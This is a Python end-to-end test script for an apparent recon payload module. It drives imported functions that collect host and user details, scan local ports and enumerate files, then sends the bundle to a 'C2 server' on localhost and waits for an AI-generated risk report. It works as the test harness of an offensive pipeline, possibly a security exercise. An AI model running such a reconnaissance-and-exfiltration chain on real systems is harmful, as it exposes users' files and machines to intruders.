"""
End-to-end test for Module 4: Enhanced Payload with File Enumeration
Tests the complete workflow from payload execution to report generation
"""
import sys
import os
import time
import requests
import json

# Add paths
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src', 'core'))

print("=" * 70)
print("🧪 MODULE 4: END-TO-END PAYLOAD TEST")
print("=" * 70)
print()

# Import payload components
from payload_v2 import (
    gather_system_info,
    scan_ports,
    enumerate_files,
    get_target_directories,
    send_to_c2
)

def test_e2e_payload():
    """Test complete payload to report workflow"""
    
    print("[1/5] 📊 Gathering system information...")
    recon_data = gather_system_info()
    print(f"   ✓ System: {recon_data['hostname']} ({recon_data['os_name']})")
    print(f"   ✓ User: {recon_data['current_user']} ({'Admin' if recon_data['is_admin'] else 'User'})")
    
    print("\n[2/5] 🔍 Scanning network ports...")
    open_ports = scan_ports(target="127.0.0.1", start_port=1, end_port=1025)
    recon_data['open_ports'] = open_ports
    print(f"   ✓ Found {len(open_ports)} open ports")
    
    print("\n[3/5] 📁 Enumerating files...")
    target_dirs = get_target_directories()[:2]  # First 2 directories
    files = enumerate_files(target_dirs, max_files=100, max_depth=2)
    recon_data['files'] = files
    
    # File summary
    recon_data['file_summary'] = {
        "total_files": len(files),
        "by_extension": {}
    }
    for file in files:
        ext = file['extension'] or 'no_extension'
        recon_data['file_summary']['by_extension'][ext] = \
            recon_data['file_summary']['by_extension'].get(ext, 0) + 1
    
    print(f"   ✓ Enumerated {len(files)} files")
    print(f"   ✓ File types: {list(recon_data['file_summary']['by_extension'].keys())[:5]}")
    
    # Build payload
    payload = {"recon_data": recon_data}
    payload_size = len(json.dumps(payload))
    print(f"   ✓ Payload size: {payload_size:,} bytes")
    
    print("\n[4/5] 📡 Sending to C2 server...")
    c2_url = "http://127.0.0.1:8000/api/submit_scan/"
    response = send_to_c2(payload, c2_url)
    
    if not response or 'session_id' not in response:
        print("   ❌ Failed to send to C2 server")
        return False
    
    session_id = response['session_id']
    print(f"   ✓ Session created: {session_id}")
    print(f"   ✓ Status: {response.get('status')}")
    
    print("\n[5/5] ⏳ Waiting for pipeline to complete...")
    max_wait = 30
    wait_time = 0
    
    while wait_time < max_wait:
        time.sleep(2)
        wait_time += 2
        
        # Check session status
        status_url = f"http://127.0.0.1:8000/api/session/{session_id}/"
        try:
            status_response = requests.get(status_url, timeout=5)
            if status_response.status_code == 200:
                status_data = status_response.json()
                current_status = status_data['status']
                print(f"   ... Status: {current_status} ({wait_time}s)")
                
                if current_status == 'complete':
                    print("\n✅ PIPELINE COMPLETE!")
                    print(f"   📄 Report: {status_data.get('report_path')}")
                    print(f"   ⏱️  Duration: {wait_time} seconds")
                    
                    # Display summary
                    summary = status_data.get('summary', {})
                    print(f"\n📊 Report Summary:")
                    print(f"   • Risk Level: {summary.get('risk_level', 'Unknown')}")
                    print(f"   • Findings: {summary.get('findings_count', 0)}")
                    print(f"   • Sensitive Files: {len(summary.get('sensitive_files', []))}")
                    
                    return True
                elif current_status == 'error':
                    print(f"\n❌ PIPELINE FAILED")
                    print(f"   Error: {status_data.get('error_message')}")
                    return False
                    
        except Exception as e:
            print(f"   ⚠️  Error checking status: {e}")
    
    print(f"\n⏱️  Timeout after {max_wait} seconds")
    return False


if __name__ == "__main__":
    try:
        success = test_e2e_payload()
        
        print("\n" + "=" * 70)
        if success:
            print("✅ MODULE 4 END-TO-END TEST: PASSED")
            print("=" * 70)
            print("\n🎉 Complete workflow verified:")
            print("   1. ✓ System reconnaissance")
            print("   2. ✓ Port scanning")
            print("   3. ✓ File enumeration")
            print("   4. ✓ C2 communication")
            print("   5. ✓ AI analysis")
            print("   6. ✓ Report generation")
            sys.exit(0)
        else:
            print("❌ MODULE 4 END-TO-END TEST: FAILED")
            print("=" * 70)
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⚠️  Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
